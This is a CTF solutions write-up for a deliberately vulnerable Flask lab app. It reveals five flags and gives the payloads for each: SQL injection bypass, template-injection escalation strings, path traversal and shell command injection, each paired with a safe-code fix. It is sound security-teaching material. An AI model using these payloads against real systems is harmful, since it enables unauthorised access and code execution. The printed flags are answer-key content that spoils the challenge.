# 🔓 SOLUTIONS.md — hack-me CTF

> ⚠ **SPOILER WARNING** — Only read this after attempting the challenge.

---

## FLAG 1 — Hardcoded Secret (A02:2021 · CWE-259)

**Flag:** `FLAG{h4rdc0d3d_s3cr3ts_4r3_4lw4ys_f0und}`

**How:** Read the source code — `app.py`, line where `FLAG_1` is assigned.

**What this teaches:** Developers frequently commit credentials, API keys, and secrets directly into version control. Tools like `git log`, `truffleHog`, `gitleaks`, and even manual `grep` can find them. This is why `.env` files and secrets managers (Vault, AWS Secrets Manager) exist.

**Real-world impact:** GitHub is continuously scraped for leaked AWS keys, tokens, and passwords. Exposed credentials are exploited within minutes of a public commit.

---

## FLAG 2 — SQL Injection Authentication Bypass (A03:2021 · CWE-89)

**Flag:** `FLAG{sql_1nj3ct10n_byp4ss3d_4uth3nt1c4t10n}`

**How:**

```
Username: admin'--
Password: anything
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the password check. The admin row is returned, revealing the flag stored in the `notes` column.

**What this teaches:** String concatenation in SQL queries is never safe. Parameterized queries (prepared statements) completely prevent this class of vulnerability.

**Fix:**

```python
# ✅ Safe
db.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

---

## FLAG 3 — Server-Side Template Injection (A03:2021 · CWE-94)

**Flag:** `FLAG{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_pwn3d}`

**How:**

```
GET /search?q={{ FLAG_3 }}
```

Jinja2 evaluates the expression because the input is interpolated directly into a template string. The `FLAG_3` variable is in scope.

**Escalation payloads:**

```
{{ config.SECRET_KEY }}                  → reveals Flask secret
{{ ''.__class__.__mro__[1].__subclasses__() }}  → object subclasses (path to RCE)
```

**What this teaches:** `render_template_string()` with user input is extremely dangerous. SSTI can escalate from information disclosure to full Remote Code Execution.

**Fix:** Never inject user input into a template string. Pass values as context variables:

```python
# ✅ Safe
return render_template_string("<h1>Results for: {{ query }}</h1>", query=user_input)
```

---

## FLAG 4 — Path Traversal (A01:2021 · CWE-22)

**Flag:** `FLAG{p4th_tr4v3rs4l_3sc4p3d_th3_w3br00t}`

**How:**

```
GET /download?file=../../secret/flag.txt
```

The `os.path.join(base_dir, filename)` call with an unsanitized `filename` allows escaping the intended `files/` directory. The flag is stored at `secret/flag.txt`, two levels above the web root anchor.

**What this teaches:** Path traversal allows reading arbitrary files on the server — `/etc/passwd`, application configs, private keys, database files. Always validate and canonicalize file paths.

**Fix:**

```python
# ✅ Safe
import os
safe_path = os.path.realpath(os.path.join(base_dir, filename))
if not safe_path.startswith(os.path.realpath(base_dir)):
    abort(403)  # Escape attempt detected
```

---

## FLAG 5 — OS Command Injection (A03:2021 · CWE-78)

**Flag:** Appears in the output of the ping utility when you inject a second command.

**How:**

```
GET /ping?host=127.0.0.1; cat secret/flag.txt
GET /ping?host=127.0.0.1 && cat secret/flag.txt
GET /ping?host=127.0.0.1 | cat secret/flag.txt
```

The shell interprets `;`, `&&`, and `|` as command separators. The `cat secret/flag.txt` runs with the same privileges as the web app process.

**What this teaches:** `shell=True` in subprocess (or `os.system()`) passes the command string to the OS shell, enabling metacharacter injection. This can result in full Remote Code Execution.

**Fix:**

```python
# ✅ Safe — shell=False + list of arguments
subprocess.run(["ping", "-c", "2", host], shell=False, timeout=10)
# Now host is treated as a literal argument — no shell parsing
```

---

## Summary

| Flag | Vulnerability                   | OWASP    | Fix                                       |
| ---- | ------------------------------- | -------- | ----------------------------------------- |
| 1    | Hardcoded secret in source      | A02:2021 | Secrets manager / env vars                |
| 2    | SQL Injection via concatenation | A03:2021 | Parameterized queries                     |
| 3    | Server-Side Template Injection  | A03:2021 | Pass values as context, never interpolate |
| 4    | Path Traversal                  | A01:2021 | `realpath()` + prefix check               |
| 5    | OS Command Injection            | A03:2021 | `shell=False` + argument list             |

---

*Built by Márcio Coutinho — Cybersecurity Specialist · Porto, Portugal*
